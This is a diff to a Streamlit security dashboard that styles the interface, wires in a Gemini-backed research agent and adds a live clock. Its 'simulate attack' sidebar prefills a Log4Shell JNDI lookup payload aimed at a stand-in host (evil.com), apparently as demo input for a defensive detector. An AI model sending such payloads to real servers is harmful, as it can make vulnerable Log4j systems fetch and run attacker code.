@@ -49,21 +49,61 @@ st.markdown("""
         border-right: 1px solid #333;
     }
     
-    /* Cards */
+    /* Animations */
+    @keyframes pulse {
+        0% { opacity: 0.8; text-shadow: 0 0 10px #00ff41; }
+        50% { opacity: 1; text-shadow: 0 0 20px #00ff41, 0 0 10px #fff; }
+        100% { opacity: 0.8; text-shadow: 0 0 10px #00ff41; }
+    }
+    
+    @keyframes scanline {
+        0% { transform: translateY(-100%); }
+        100% { transform: translateY(100%); }
+    }
+
+    /* Scanline Overlay */
+    .scanline {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: linear-gradient(to bottom, transparent 50%, rgba(0, 255, 65, 0.02) 51%, transparent 51%);
+        background-size: 100% 4px;
+        pointer-events: none;
+        z-index: 9999;
+    }
+    
+    /* Elegant Card Hover */
     .decision-card {
         border-left: 5px solid;
         padding: 15px;
         margin-bottom: 10px; 
-        background: #111;
+        background: linear-gradient(90deg, #111 0%, #0a0a0a 100%);
         border-radius: 4px;
         border: 1px solid #222;
-        transition: transform 0.1s;
+        transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        position: relative;
+        overflow: hidden;
     }
     .decision-card:hover {
-        transform: scale(1.01);
-        box-shadow: 0 0 15px rgba(0,0,0,0.5);
+        transform: translateX(5px);
+        box-shadow: -5px 0 15px rgba(0, 255, 65, 0.1);
+        border-color: #333;
+    }
+    
+    /* Metrics polished */
+    div[data-testid="stMetric"] {
+        background: #0e0e0e;
+        border: 1px solid #222;
+        transition: 0.3s;
+    }
+    div[data-testid="stMetric"]:hover {
+        border-color: #00ff41;
+        box-shadow: 0 0 20px rgba(0, 255, 65, 0.2);
     }
 </style>
+<div class="scanline"></div>
 """, unsafe_allow_html=True)
 
 # --- SIDEBAR CONFIG ---
@@ -85,12 +125,34 @@ with st.sidebar:
 
     st.markdown("### 🎮 INTERACTIVE DEMO")
     target_research = st.text_input("Deep Research Target", "Log4Shell")
+    
     if st.button("LAUNCH RESEARCH AGENT"):
-        import subprocess
-        # Run CLI research command in background
-        subprocess.Popen([sys.executable, "src/cli.py", "research", target_research])
-        st.toast(f"Agent dispatched for {target_research}", icon="🚀")
-        
+        try:
+            with st.spinner(f"🕵️ Agent Deploying: Researching '{target_research}'..."):
+                # Import here to avoid top-level issues if env is missing
+                from src.prometheus.researcher import DeepResearchAgent, ResearchReport
+                from src.core.config import settings
+                
+                # Check for API Key
+                if not settings.gemini_api_key:
+                     st.error("❌ GEMINI_API_KEY not found. Please set it in .env or Streamlit Secrets.")
+                else:
+                    agent = DeepResearchAgent()
+                    report = agent.investigate(target_research)
+                    st.success("Mission Complete!")
+                    
+                    with st.expander("📄 MISSION REPORT", expanded=True):
+                        st.markdown(report.findings)
+                        
+                    st.toast(f"Research Complete: {target_research}", icon="✅")
+                    
+        except Exception as e:
+            error_msg = str(e)
+            if "429" in error_msg or "ResourceExhausted" in error_msg:
+                 st.error(f"⚠️ **RESOURCE EXHAUSTED (429)**\n\nThe Gemini API free tier quota has been exceeded. Please wait ~60s before retrying.\n\n*Error Details: {error_msg}*")
+            else:
+                 st.error(f"❌ **MISSION FAILED**\n\nError: {error_msg}")
+
     st.markdown("### 💥 SIMULATE ATTACK")
     attack_payload = st.text_area("Attack Payload", "${jndi:ldap://evil.com}")
     if st.button("SEND MALICIOUS REQUEST"):
@@ -140,6 +202,10 @@ def load_logs():
 # --- MAIN LOOP ---
 if auto_refresh:
     while True:
+        # Update Time Dynamically
+        with col_head2:
+            st.markdown(f"<div style='text-align: right; color: #555; animation: pulse 2s infinite;'>SYSTEM TIME<br><span style='color: #00ff41; font-family: \"Courier New\"; font-size: 1.2em; font-weight: bold;'>{datetime.now().strftime('%H:%M:%S')}</span></div>", unsafe_allow_html=True)
+
         logs = load_logs()
         df = pd.DataFrame(logs) if logs else pd.DataFrame(columns=["timestamp", "decision", "trace", "reasoning", "_time"])
 
